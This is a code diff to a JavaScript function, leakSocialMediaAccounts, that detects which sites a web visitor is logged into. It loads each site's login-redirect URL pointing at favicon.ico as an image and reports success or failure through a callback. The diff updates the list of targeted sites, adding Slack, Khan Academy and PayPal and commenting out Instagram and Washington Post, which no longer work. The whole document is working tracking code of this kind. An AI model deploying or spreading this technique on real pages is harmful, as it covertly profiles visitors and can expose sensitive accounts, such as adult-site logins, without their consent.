@@ -4,10 +4,6 @@ var leakSocialMediaAccounts = function(callback) {
         redirect: "/login?return_to=%2Ffavicon.ico",
         name: "Square"
     }, {
-        domain: "https://www.instagram.com",
-        redirect: "/accounts/login/?next=%2Ffavicon.ico",
-        name: "Instagram"
-    }, {
         domain: "https://twitter.com",
         redirect: "/login?redirect_after_login=%2Ffavicon.ico",
         name: "Twitter"
@@ -119,13 +115,21 @@ var leakSocialMediaAccounts = function(callback) {
         domain: "http://www.youporn.com",
         redirect: "/login/?previous=/favicon.ico",
         name: "YouPorn"
-    }, {
-        domain: "https://subscribe.washingtonpost.com/loginregistration/index.html#/register/group/default?action=login&destination=https:%2F%2Fwashingtonpost.com%2Ffavicon.ico",
-        redirect: "/login/?previous=/favicon.ico",
-        name: "Washington Post"
+    }, {        
+        domain: "https://slack.com",
+        redirect: "/checkcookie?redir=https%3A%2F%2Fslack.com%2Ffavicon.ico%23",
+        name: "Slack"
+    }, {        
+        domain: "https://www.khanacademy.org",
+        redirect: "/login?continue=https%3A//www.khanacademy.org/favicon.ico",
+        name: "Khan Academy"
+    }, {        
+        domain: "https://www.paypal.com",
+        redirect: "/signin?returnUri=https://t.paypal.com/ts?v=1.0.0",
+        name: "Paypal"
     }];
 
-    //     Do not work because they do not redirect immediately
+    //     Do not work because they do not redirect immediately or fixed the issue
     //     {
     //         url: "https://login.live.com/login.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fprofile.microsoft.com%2FregsysProfilecenter%2FImages%2FLogin.jpg",
     //         name: "Microsoft"
@@ -138,11 +142,19 @@ var leakSocialMediaAccounts = function(callback) {
     //     }, {
     //         url: "https://slack.com/checkcookie?redir=https%3A%2F%2Fcapira.slack.com%2Ffavicon.ico%23%00asd",
     //         name: "Linkedin"
-    //     }
+    //     } , {
+    //          domain: "https://subscribe.washingtonpost.com/loginregistration/index.html#/register/group/default?action=login&destination=https:%2F%2Fwashingtonpost.com%2Ffavicon.ico",
+    //          redirect: "/login/?previous=/favicon.ico",
+    //          name: "Washington Post"
+    //     }, {
+    //          domain: "https://www.instagram.com",
+    //          redirect: "/accounts/login/?next=%2Ffavicon.ico",
+    //          name: "Instagram"
+    //      }
 
     platforms.forEach(function(network) {
         var img = document.createElement('img');
-        img.src = network.domain+network.redirect;
+        img.src = network.domain + network.redirect;
         img.onload = function() {
             callback(network, true);
         };
